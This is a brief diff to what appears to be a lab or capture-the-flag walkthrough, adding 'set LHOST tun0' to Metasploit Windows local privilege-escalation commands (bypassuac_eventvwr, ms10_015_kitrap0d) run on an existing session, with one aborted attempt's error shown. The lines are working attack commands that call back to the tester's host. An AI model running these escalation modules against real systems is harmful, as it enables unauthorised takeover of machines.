@@ -111,12 +111,14 @@ run
 
 use exploit/windows/local/bypassuac_eventvwr
 set SESSION 1
+set LHOST tun0
 run
 
 [-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
 
 use exploit/windows/local/ms10_015_kitrap0d
 set SESSION 1
+set LHOST tun0
 run
 ```
 
